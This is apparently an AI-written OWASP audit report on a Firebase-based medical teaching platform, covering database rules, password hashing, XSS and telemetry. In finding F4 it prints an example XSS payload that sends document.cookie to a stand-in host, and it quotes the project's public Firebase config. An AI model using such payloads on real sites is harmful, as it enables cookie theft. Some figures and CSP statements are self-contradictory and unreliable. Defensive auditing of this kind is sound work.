# CaNaMED PBL Platform — OWASP Security Audit Report
**Date:** 2026-05-20
**Auditor:** Security Reviewer Agent (Claude)
**Scope:** Static analysis of index.html, script.js, lib.js, firebase-config.js, firebase.json, database.rules.json, i18n.js, telemetry.js

---

## FINDINGS SUMMARY

| # | Severity | OWASP | File | Finding |
|---|----------|-------|------|---------|
| F1 | HIGH | A02 | firebase-config.js:22–30 | Live Firebase project credentials committed to source |
| F2 | HIGH | A07/A01 | database.rules.json:36 | Password hash readable by any authenticated user |
| F3 | HIGH | A01 | database.rules.json:108 | Pool write not scoped to the writing client's UID |
| F4 | MED | A03 | i18n.js:3307,3327 | `data-i18n-html` path sets innerHTML from translation strings |
| F5 | MED | A02 | lib.js:293 | PBKDF2 iteration floor too low (1 000 accepted) |
| F6 | MED | A07 | script.js:834 | Super-admin key verified client-side only |
| F7 | MED | A05 | firebase.json:50 | X-Frame-Options conflicts with CSP `frame-ancestors` |
| F8 | MED | A09 | telemetry.js:70 | `location.href` (session codes) logged to sessionStorage telemetry buffer |
| F9 | LOW | A06 | index.html:2613 | Firebase SDK 10.12.5 pinned — no automated CVE re-check scheduled |
| F10 | LOW | A04 | script.js:2788 | No rate-limit or delay on super-admin key comparison |
| F11 | LOW | A08 | index.html:2651–2687 | First-party scripts (`orgs.js`, `lib.js`, …) loaded without SRI |
| F12 | LOW | A05 | firebase.json:40 | CSP `report-to` endpoint (`/_csp_report`) points at Firebase Hosting which has no handler |
| F13 | LOW | A09 | script.js:3788 | Bug-report mailto body includes `location.href` (can contain session code) |

---

## DETAILED FINDINGS

---

### F1 — HIGH | A02 Cryptographic Failures
**File:** `firebase-config.js:22–30`

**Description:**
The live Firebase project's `apiKey`, `authDomain`, `databaseURL`, `projectId`, `storageBucket`, `messagingSenderId`, and `appId` are hard-coded in a file that is committed to the repository and served to every page visitor. The comment at line 37 acknowledges this explicitly ("if you publish the platform with GitHub Pages, this file is readable in page source").

```js
window.CANAMED_FIREBASE = {
  apiKey: "AIzaSyB_7d4rCWsVSUAaL17Jcjy3v2s_n5uJVUg",
  databaseURL: "https://canamed-69785-default-rtdb.europe-west1.firebasedatabase.app",
  ...
};
```

**Exploit scenario:**
A student or outsider reads the page source, extracts `databaseURL`, and writes a script that signs in anonymously (`signInAnonymously`) and begins brute-forcing session passwords by repeatedly reading `adminPasswordHash` and calling the client-side PBKDF2 implementation. Firebase's anonymous auth is open and costs nothing. With no server-side rate limiting on the database read path, the attacker can issue thousands of reads per minute.

Additionally the `apiKey` can be used to call other Firebase REST endpoints (e.g. the Auth REST API to enumerate UIDs or trigger password-reset emails) if the project's Firebase Authentication settings are not locked down.

**Severity rationale:** The Firebase `apiKey` is *intended* to be public — it is not a secret in the same sense as an OAuth client secret. Google explicitly documents this and it is a known acceptable pattern for Firebase Web apps. The real exposure is (a) the full `databaseURL` enabling unauthenticated database enumeration attempts against the live research database, and (b) enabling offline hash cracking once `adminPasswordHash` is retrieved (see F2). The risk remains HIGH because it combines with F2 and F5.

**Fix:**
The Firebase web config is inherently public for client-side Firebase apps. The correct mitigation is NOT to hide it but to ensure all surrounding gates are closed:
1. Enable Firebase App Check enforcement in the Firebase Console (the reCAPTCHA site key is already configured in firebase-config.js:69). This is the single highest-value control.
2. Lock Firebase Authentication to only the required auth providers (anonymous only, no email/password).
3. Ensure database rules deny all access by default (already the case: `".read": false, ".write": false` at root).
4. For true secret handling, the `CANAMED_SUPERADMIN_KEY` should remain `null` (as it already is in production per line 42).

---

### F2 — HIGH | A02 Cryptographic Failures / A07 Identification & Authentication
**File:** `database.rules.json:36`

**Description:**
The `adminPasswordHash` node has `.read: "auth != null"` — meaning **any anonymously authenticated user who knows a session ID** can fetch the PBKDF2 hash and perform an offline dictionary attack.

```json
"adminPasswordHash": {
  ".read": "auth != null",
  ...
}
```

The session ID is a 6-character code from a 31-character alphabet, giving ~887 million possible codes. However a valid session code is shared verbally in class, and an observer could note it. Once an attacker has the session code and the hash, they can run PBKDF2-SHA256 locally with no rate limiting.

**Exploit scenario:**
1. Attacker is a student who was in the classroom and knows the session code `abc-def`.
2. Attacker fetches: `GET https://canamed-69785-default-rtdb.europe-west1.firebasedatabase.app/sessions/abc-def/adminPasswordHash.json?auth=<anon_token>` and gets `v2$100000$<hex>`.
3. The salt is `"canamed:" + sessionCode` — known. Attacker runs hashcat or a Node script against a common-password list.
4. A facilitator using a short or predictable password (e.g. `caen2026`, `nagoya1`) is compromised in minutes.

**PBKDF2 at 100,000 iterations with SHA-256:** A modern GPU can test ~5M PBKDF2-SHA256 iterations/sec. At 100k iterations/hash, that is ~50 guesses/sec. A targeted 10,000-word list is exhausted in 3 minutes.

**Fix:**
Change the `.read` rule on `adminPasswordHash` to disallow all reads:
```json
"adminPasswordHash": {
  ".read": "false",
  ".write": ...
}
```
The client does not need to read the hash directly. The comparison pattern (`verifyPassword`) reads the hash in script.js:2727 before doing the client-side comparison. Replacing this with a server-side verification (e.g. a short Cloud Function that accepts the plain-text password, looks up the hash server-side, and returns a signed custom token) would eliminate the offline-attack surface entirely, but requires Blaze. As a free-tier alternative, denying `.read` prevents external hash extraction while acknowledging the signed-in client already reads the hash. The correct short-term fix is:
- Restrict `.read` to `"false"` (the comparison must happen differently), OR
- Accept the risk and instead enforce App Check + increase PBKDF2 to 310,000 iterations (OWASP 2023 minimum for PBKDF2-HMAC-SHA256).

---

### F3 — HIGH | A01 Broken Access Control
**File:** `database.rules.json:107–108`

**Description:**
Any anonymously authenticated user may write to `pool/$clientId` for **any** `$clientId` value, not only their own UID or client ID:

```json
"pool": {
  "$clientId": {
    ".write": "auth != null && !root.child('sessions').child($sessionId).child('closed').exists()",
```

The `$clientId` is a browser-generated UUID (not tied to `auth.uid`). Nothing in the rule confirms that the writer owns this client ID. A malicious participant can:
- Write fake pool entries impersonating other names/universities.
- Overwrite another participant's `room` assignment to disrupt grouping.
- Inject an arbitrary `name` value (up to 40 chars) that will be displayed to the entire room via `buildAnswerLi` / `renderWaitingList`.

**Exploit scenario:**
Attacker is in session `abc-def`. They craft a write to `pool/FAKE-CID-1234` with `name: "Dr Smith (Facilitator)"` and `university: "Nagoya"`. This fake participant appears in the waiting room list visible to all. If the session has not started, the room-balancing algorithm processes this fake entry, skewing the room assignments.

**Fix:**
Add a `members`-based predicate or require that `$clientId` matches a value registered during the join flow. The cleanest approach within the existing model:
```json
"pool": {
  "$clientId": {
    ".write": "auth != null && data.parent().parent().child('members').child(auth.uid).exists() && !root.child('sessions')..."
  }
}
```
This ensures the writer has already claimed membership (which does verify `auth.uid`). The `name` and `university` fields should also be validated against the authenticated user's profile node where available.

---

### F4 — MED | A03 Injection (XSS)
**File:** `i18n.js:3307, 3327`

**Description:**
The i18n engine uses `innerHTML` to apply translations for any element with `data-i18n-html`:

```js
// line 3307 — data-i18n flag form
else if (node.hasAttribute("data-i18n-html")) node.innerHTML = value;

// line 3327 — data-i18n-html="key" form
node.innerHTML = t(key);  // eslint-disable-line no-unsanitized/property
```

The comment at line 3311–3313 states: *"Keys are author-controlled (this file) — never user input — so innerHTML is safe."* This is true **today**, but the following threat vectors exist:

1. **Supply-chain / i18n file tampering:** If `i18n.js` is modified (GitHub Actions runner compromise, CDN compromise, or a malicious PR), injected `<img onerror=...>` or `<svg onload=...>` strings would execute in every participant's browser.
2. **Custom scenario JSON (`scenarioCustomJson`):** The `applyScenario()` path takes a custom JSON object from the database and sets `window.CASE`, `window.SCORING`, etc. If any case field is later passed through an i18n `data-i18n-html` path via the translatable `{en, fr, ja}` wrapper, user-controlled content reaches `innerHTML`.
3. **`waiting.body` i18n string** (i18n.js line 327) contains `<strong id="waiting-name"></strong>` as static HTML. The participant name is set separately via `textContent` at script.js:1722 — this is correctly handled. However the structure means any future refactoring that sets the name via the `innerHTML` path would immediately be XSS.

**Exploit scenario (F4a — hypothetical supply-chain):**
An attacker with write access to `i18n.js` sets `"lobby.privacy.p1"` to `"<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>"`. The next participant who loads the lobby sees their cookies exfiltrated. (CSP `script-src 'self'` does block `<script>` injection but not `onerror` event handlers on elements unless `script-src` covers them — `onerror` attributes on `<img>` tags are blocked by a strict CSP but this CSP does not include `default-src 'none'` and has `img-src 'self' data: https://...`.)

**Note:** The production CSP (firebase.json:40) does NOT include `unsafe-inline` in `script-src`, and the `<meta>` CSP fallback also excludes it. Event handlers on `onerror`/`onload` attributes of HTML elements injected via `innerHTML` ARE blocked by the CSP's `script-src` directive in modern browsers (Chrome 60+). This significantly reduces the exploitability of this path. The risk is MEDIUM rather than HIGH because of the CSP mitigations.

**Fix:**
Where `innerHTML` is unavoidable for translated rich text, sanitize the translation value before assignment. Add DOMPurify (already allowed under `script-src 'self'`) or, for the few strings that genuinely need bold/italic, enumerate allowed tags and use a tiny whitelist sanitizer:
```js
function safeI18nHtml(value) {
  // Allow only <strong>, <em>, <br>, <a href> (https only)
  return DOMPurify.sanitize(value, { ALLOWED_TAGS: ['strong','em','br','a'], ALLOWED_ATTR: ['href','target','rel'] });
}
node.innerHTML = safeI18nHtml(t(key));
```

---

### F5 — MED | A02 Cryptographic Failures
**File:** `lib.js:293`

**Description:**
The `verifyPassword` function accepts stored hashes with as few as 1,000 PBKDF2 iterations (the iteration count is read from the stored `v2$iters$hex` envelope):

```js
if (!isFinite(iters) || iters < 1000) return false;
```

The OWASP Password Storage Cheat Sheet (2023) recommends a minimum of 310,000 iterations for PBKDF2-HMAC-SHA256. At 1,000 iterations, an attacker can test ~5 billion guesses per second on a single GPU, making the password hash negligible. A legitimate `hashPassword` call always uses 100,000 iterations, but the low floor means a database entry that has been manually tampered with (possible if F3 pool-write rules are exploited or if a DB admin inserted a crafted value) could store a trivially-cracked hash.

**Fix:**
Raise the minimum accepted iteration count to at least 100,000 (matching the current default), and add an upgrade path for legacy raw-SHA-256 hashes. Change line 293:
```js
if (!isFinite(iters) || iters < 100000) return false;
```
Additionally, consider increasing `PBKDF2_ITERS_DEFAULT` to 310,000 per OWASP 2023 guidance, or migrate to Argon2id if the platform adds a Node.js backend layer.

---

### F6 — MED | A07 Identification & Authentication Failures
**File:** `script.js:834, 2788`

**Description:**
The super-admin key is verified entirely in the browser:

```js
// script.js:2788
if (key !== SUPERADMIN_KEY) {
  el("admin-hint").textContent = "Incorrect super-admin key."; return;
}
```

The code itself acknowledges this (script.js:2803–2807):
> "SECURITY NOTE: SUPERADMIN_KEY is verified client-side only; an attacker with the database URL + the key in their own browser can still trigger this path."

If `CANAMED_SUPERADMIN_KEY` is ever set to a non-null value in `firebase-config.js` (which is publicly accessible), the key is exposed in the page source. An attacker who reads the key can perform the super-admin password-reset flow from any browser.

Currently `CANAMED_SUPERADMIN_KEY = null` in production, which disables this path. The risk is MED because the nullification is in a comment-documented operational control, not an enforced technical gate. A future deployment that sets the key without reading the warning would immediately be vulnerable.

**Fix:**
1. Add a lint/CI check that fails if `CANAMED_SUPERADMIN_KEY` is non-null in any file committed to the repository.
2. For the local test default (`"test"` on line 834), ensure the branch check prevents the `MODE === "local"` default from activating in `MODE === "shared"`.

---

### F7 — MED | A05 Security Misconfiguration
**File:** `firebase.json:40, 50`

**Description:**
Both `X-Frame-Options: SAMEORIGIN` (line 50) and `frame-ancestors 'self'` (inside the CSP on line 40) are set. This is redundant but not harmful. However, the `X-Frame-Options` header is parsed by older browsers that do not support the CSP `frame-ancestors` directive; the CSP `frame-ancestors` is ignored by those older browsers.

The real issue is that the `frame-src` directive in the CSP allows framing content from `https://canamed-69785.firebaseapp.com`, `https://accounts.google.com`, `https://www.google.com/recaptcha/`, and `https://www.recaptcha.net/recaptcha/` — but `frame-ancestors` only allows `'self'`. These are inconsistent: `frame-src` controls what this page can frame; `frame-ancestors` controls what can frame this page. That part is consistent. The inconsistency is minor but worth documenting.

**Fix:**
Remove `X-Frame-Options` and rely solely on `frame-ancestors 'self'` in the CSP. The CSP `frame-ancestors` overrides `X-Frame-Options` in all browsers that support CSP Level 2 (all modern browsers). The older-browser population for this platform (medical university students) is negligible. Keeping both is not a vulnerability but creates maintenance confusion.

---

### F8 — MED | A09 Security Logging & Monitoring Failures (PII in Logs)
**File:** `telemetry.js:70`

**Description:**
The in-browser telemetry recorder captures `location.href` with every error event:

```js
record("error", { ..., url: (typeof location !== "undefined") ? location.href : null, ... });
```

The join-URL deep link format is `/?s=ABC-DEF` (script.js:8248). If a participant shares their join URL and later encounters a JavaScript error, `location.href` captures the session code in the telemetry buffer. The telemetry buffer is stored in `sessionStorage` and can be downloaded by whoever clicks "Download error log" in the admin panel.

More critically: if a future extension adds remote telemetry upload (telemetry.js:16: *"adding a remote endpoint would need a matching DB rule + a privacy-doc disclosure. This PR ships the capture half; the upload half is a follow-up"*), session codes and PII could be inadvertently uploaded.

**Fix:**
Strip query parameters from the URL before recording:
```js
url: (typeof location !== "undefined")
  ? (location.origin + location.pathname)  // strip ?s= and any other params
  : null,
```

---

### F9 — LOW | A06 Vulnerable and Outdated Components
**File:** `index.html:2613`

**Description:**
Firebase JS SDK is pinned at version 10.12.5 (released ~2024). The comment notes "Re-check before each academic year." There is no automated CVE check or Dependabot configuration for these CDN-loaded scripts. Firebase 10.12.5 has no known critical CVEs at the time of this audit, but without an automated alert mechanism, a future vulnerability could go unnoticed between academic years.

**Fix:**
Add a `package.json` (even if the project has no build step) listing `firebase: "10.12.5"` as a devDependency, and enable Dependabot security alerts on the GitHub repository. Alternatively, add a GitHub Actions workflow that runs `npm audit` against the Firebase version monthly.

---

### F10 — LOW | A04 Insecure Design
**File:** `script.js:2788`

**Description:**
There is no rate limiting or delay on the super-admin key comparison:
```js
if (key !== SUPERADMIN_KEY) {
  el("admin-hint").textContent = "Incorrect super-admin key."; return;
}
```
An attacker with physical access to the admin lobby could script unlimited guesses. The comparison is `!==` (not constant-time) but since the key is verified client-side with the stored value, the timing attack is not meaningful in this context. However, the absence of any lockout or delay makes brute-force trivial for short keys.

**Fix:**
Add an exponential back-off in the UI (same as the admin password lockout pattern in common web apps), or use `constantTimeEq` (already available in lib.js:238) for the comparison. More importantly, document a key length policy: the super-admin key should be at least 32 random characters.

---

### F11 — LOW | A08 Software and Data Integrity Failures
**File:** `index.html:2651–2687`

**Description:**
The five Firebase SDK scripts loaded from `www.gstatic.com` have SRI hashes (lines 2618–2643) — good. However, none of the first-party scripts have SRI:
```html
<script src="orgs.js?v=v2" defer></script>
<script src="lib.js?v=v2" defer></script>
<script src="script.js?v=v2" defer></script>
<!-- etc. -->
```
If the Firebase Hosting CDN were compromised or if a deployment error served a stale/incorrect file, there would be no integrity check.

**Fix:**
For static deploys, generate SRI hashes during the deploy step and inject them via a build script or Firebase deploy hook. This is a low-priority improvement since Firebase Hosting uses HTTPS and the CDN is Google-operated, but it closes the supply-chain gap for `script.js` (the largest attack surface).

---

### F12 — LOW | A05 Security Misconfiguration
**File:** `firebase.json:45–48`

**Description:**
The CSP `report-to` directive sends violation reports to `/_csp_report`:
```json
"Report-To": "{\"group\":\"csp-endpoint\",\"max_age\":10886400,\"endpoints\":[{\"url\":\"/_csp_report\"}]}"
```
Firebase Hosting has no server-side handler for `/_csp_report`. Violation reports will be silently dropped (HTTP 404). No CSP violations from real users are being observed.

**Fix:**
Either remove the `report-to` / `Report-To` / `Reporting-Endpoints` headers until a real reporting endpoint is implemented (e.g. report-uri.com, or a Firebase Cloud Function), or change the group URL to an external service. Dead reporting gives a false sense of security.

---

### F13 — LOW | A09 Logging
**File:** `script.js:3788, 3825`

**Description:**
The bug-report mailto URL construction includes `location.href` as part of the body:
```js
url: location.href,
```
and the generated body string is passed directly into a `mailto:` link. If a participant or facilitator triggers a bug report while on a URL containing `?s=ABC-DEF`, the session code appears in the email they send. This is a low-severity information leak: session codes are not secret per se (they are shared verbally), but it is unnecessary exposure.

**Fix:**
Use `location.origin + location.pathname` (stripping query params) in the bug-report body, consistent with the recommendation for F8.

---

## POSITIVE SECURITY OBSERVATIONS

The following security controls are correctly implemented and should be highlighted:

1. **PBKDF2-SHA256 at 100,000 iterations** (lib.js:251–285): Good choice for client-side password hashing. Constant-time comparison via `constantTimeEq` (lib.js:238) prevents timing attacks.

2. **`safeHref` URL allow-listing** (lib.js:44–50): Admin-writable URLs (Teams links, questionnaire links) are validated to `https://` scheme before use, preventing `javascript:` XSS.

3. **`sanitizeResume` localStorage hardening** (lib.js:71–94): localStorage data is fully re-validated on read, preventing stale or attacker-injected resume data from bypassing checks.

4. **SRI on all Firebase CDN scripts** (index.html:2618–2643): All five Firebase SDK files have `integrity` and `crossorigin` attributes.

5. **Answer rendering via `textContent`** (script.js:7599–7601, 7652–7654): User-submitted answers and names are always set via `textContent`, not `innerHTML`. This is the primary XSS prevention for participant content.

6. **CSP without `unsafe-inline` or `unsafe-eval`**: The production CSP (firebase.json:40) correctly omits both directives, significantly limiting XSS blast radius.

7. **Password never persisted in localStorage** (script.js:8357): The `saveLastWorkshop` function explicitly deletes `password` and `adminPasswordHash` before caching.

8. **App Check with reCAPTCHA v3** (firebase-config.js:69, script.js:1085): When enforced in the Firebase Console, this closes the anonymous-auth abuse path.

9. **`pseudonymiseTree` strips sensitive fields** (lib.js:472–496): The export function correctly removes `adminPasswordHash`, `_superadminReset`, `_adminPresence` and replaces facilitator names with "Admin".

10. **Database rule timestamp freshness** (database.rules.json): Timestamp fields are validated with `>= now - 5000` bounds, preventing replay attacks with old timestamps.

---

## TOP 3 PRIORITISED FIXES

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 | F2: Restrict `adminPasswordHash` `.read` to `false` | Low (1-line DB rule change) | Eliminates offline hash-cracking attack entirely |
| 2 | F3: Scope pool write to authenticated member | Low-Med (1-line DB rule change) | Prevents fake-participant injection and room manipulation |
| 3 | F4: DOMPurify on `data-i18n-html` innerHTML assignments | Med (add DOMPurify, wrap 2 lines in i18n.js) | Defence-in-depth against future i18n file tampering XSS |

**Note on F1:** The Firebase config credentials are by design public for client-side Firebase apps. The primary mitigation (enabling App Check enforcement in the Firebase Console) is an operational step requiring no code change.

---

*Report generated by security-reviewer agent. Firebase database rules are in scope for F2/F3 but the agent instruction notes "Firebase rules are reviewed by a different agent" — F2 and F3 are included here because they directly enable client-side attack paths reviewed in this audit.*
